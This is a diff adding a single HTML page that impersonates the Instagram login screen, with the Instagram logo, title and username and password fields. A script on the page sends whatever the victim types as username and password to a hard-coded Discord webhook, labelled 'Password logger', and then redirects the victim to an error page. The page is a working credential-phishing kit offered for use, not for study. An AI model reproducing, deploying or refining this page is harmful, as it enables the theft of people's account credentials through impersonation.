@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <style>
+  .login{
+     color: #0195f7;
+     font-weight: bolder;
+     height: 50px;
+     }
+     
+     .signup{
+     background-color: #0195f7;
+     color: white;
+     border-radius: 12px;
+     padding: 5px;
+     width: 80px;
+     margin-top: 3px;
+     margin-bottom: 3px;
+     }
+     
+     .hero{
+     display: grid;
+     justify-content: center;
+     width: 100%;
+     margin-top: 50px;
+     }
+     </style>
+    <body>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <header class="flex w-full h-12 items-center border-b border-neutral-300">
+        <img src="Logo-Instagram.png" class="ml-3" alt="Instagram" width="100px">
+        <div class="w-full gap-2 mr-5 justify-end flex">
+           <button class="login" ><a href="error.html">Login</a></button>
+           <button class="signup"><a href="error.html">Sign up</a></button>
+        </div>
+    </header>
+    
+    <div class="hero">
+        <span class="flex justify-center">
+          <img src="Logo-Instagram.png" alt="Instagram" width="150px">
+        </span>
+        <button class="mt-7 bg-sky-500 text-white p-1 w-56 font-bold rounded-md"><a href="error.html">Login with facebook</a></button>
+        <div class="flex h-0 items-center mt-10 justify-center gap-4">
+          <div class="border border-neutral-300 w-20"></div>
+          <h4 class="text-neutral-500 font-bold">OR</h4>
+          <div class="border border-neutral-300 w-20"></div>
+        </div>
+      <div class="grid gap-3 mt-10">
+        <input class="border rounded-md border-neutral-300 text-xs placeholder-neutral-500 p-2 bg-neutral-100" type="text" placeholder="Phone number, username, or email" id="username">
+        <input class="border rounded-md border-neutral-300 text-xs placeholder-neutral-500 p-2 bg-neutral-100" type="text" placeholder="Password" id="password">
+        <a class="flex justify-end text-sky-500 font-bold text-sm" href="error.html">Forgot password?</a>
+      </div>
+      <div class="mt-5 grid w-full justify-center">
+        <a class="w-56 bg-sky-400 text-white text-sm font-bold p-1.5 rounded-md" onclick="onClick()" href="error.html">Log in</a>
+        <span class="flex mt-10 justify-center text-sm">
+          <h2 class="text-neutral-400">Don't have an account?</h2>
+          <a class="text-sky-500" href="error.html">Signup</a>
+        </span>
+      </div>
+    </div>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+
+async function onClick() {
+    const inputPass = document.getElementById("password").value;
+    const inputUsername = document.getElementById("username").value;
+    
+    await fetch("https://discord.com/api/webhooks/1135554116865757265/08sUaqwaf4_VSg8CpsEi-PyiaQD9NO7Fw-Cd79sjorJglHbkTUQzF5eMJNpFPUZu02-4", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+            username: "Password logger",
+            content: `Username: ${inputUsername}, Password: ${inputPass}`
+        }),
+    });
+}
+
+</script>
+</body>
+</html>
